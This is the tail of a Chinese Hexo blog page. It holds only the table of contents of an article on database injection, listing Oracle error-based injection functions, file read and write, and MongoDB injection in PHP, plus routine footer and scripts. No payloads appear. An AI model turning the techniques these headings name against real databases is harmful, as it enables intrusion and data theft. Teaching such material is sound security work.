class="toc-number">3.6.2.</span> <span class="toc-text">获取表字段名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%86%85%E5%AE%B9"><span class="toc-number">3.6.3.</span> <span class="toc-text">获取表内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 文件或目录操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95%E2%80%94%E2%80%94%E5%8F%AA%E8%83%BD%E5%88%97%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.1.</span> <span class="toc-text">列目录——只能列安装目录下的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.2.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.3.</span> <span class="toc-text">写文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 基本语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-1-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.1.</span> <span class="toc-text">4.4.1 联合查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-1-utl-inaddr-get-host-name"><span class="toc-number">4.5.1.</span> <span class="toc-text">4.5.1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-2-ctxsys-drithsx-sn"><span class="toc-number">4.5.2.</span> <span class="toc-text">4.5.2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-3-CTXSYS-CTX-REPORT-TOKEN-TYPE"><span class="toc-number">4.5.3.</span> <span class="toc-text">4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-4-XMLType"><span class="toc-number">4.5.4.</span> <span class="toc-text">4.5.4 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-6-dbms-xdb-version-checkin"><span class="toc-number">4.5.5.</span> <span class="toc-text">4.5.6 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-7-dbms-xdb-version-makeversioned"><span class="toc-number">4.5.6.</span> <span class="toc-text">4.5.7 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-8-dbms-xdb-version-uncheckout"><span class="toc-number">4.5.7.</span> <span class="toc-text">4.5.8 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-9-dbms-utility-sqlid-to-sqlhash"><span class="toc-number">4.5.8.</span> <span class="toc-text">4.5.9 dbms_utility.sqlid_to_sqlhash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-10-ordsys-ord-dicom-getmappingxpath"><span class="toc-number">4.5.9.</span> <span class="toc-text">4.5.10 ordsys.ord_dicom.getmappingxpath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-11-UTL-INADDR-get-host-name"><span class="toc-number">4.5.10.</span> <span class="toc-text">4.5.11 UTL_INADDR.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-12-UTL-INADDR-get-host-address"><span class="toc-number">4.5.11.</span> <span class="toc-text">4.5.12 UTL_INADDR.get_host_address</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-NoSQL%E4%B8%8EMongoDB%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 NoSQL与MongoDB基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-PHP%E6%93%8D%E4%BD%9CMongoDB"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 PHP操作MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8MongoDB%E7%B1%BB%E4%B8%AD%E7%9B%B8%E5%BA%94%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.1.</span> <span class="toc-text">使用MongoDB类中相应的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E9%9B%86%E5%90%88"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">1. 创建集合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%8F%92%E5%85%A5%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.2.</span> <span class="toc-text">2. 插入文档</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.3.</span> <span class="toc-text">查找文档</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.4.</span> <span class="toc-text">更新文档</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%96%87%E6%A1%A3"><span class="toc-number">5.2.1.5.</span> <span class="toc-text">删除文档</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8execute-%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">5.2.2.</span> <span class="toc-text">使用execute()函数执行字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-PHP-MongoDB%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 PHP MongoDB注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E6%95%B0%E7%BB%84%E6%B3%A8%E5%85%A5-%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.1.</span> <span class="toc-text">PHP数组注入&#x2F;重言式注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#execute-%E6%89%A7%E8%A1%8C%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AF%BC%E8%87%B4%E7%9A%84%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.2.</span> <span class="toc-text">execute()执行拼接字符串导致的注入&#x2F;联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B3%A8%E9%87%8A"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">利用注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%97%AD%E5%90%88"><span class="toc-number">5.3.2.2.</span> <span class="toc-text">利用闭合</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考文章</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql%E5%8F%82%E8%80%83"><span class="toc-number">7.1.</span> <span class="toc-text">mssql参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postgresql%E5%8F%82%E8%80%83"><span class="toc-number">7.2.</span> <span class="toc-text">postgresql参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E5%8F%82%E8%80%83"><span class="toc-number">7.3.</span> <span class="toc-text">Oracle参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MongoDB%E5%8F%82%E8%80%83"><span class="toc-number">7.4.</span> <span class="toc-text">MongoDB参考</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
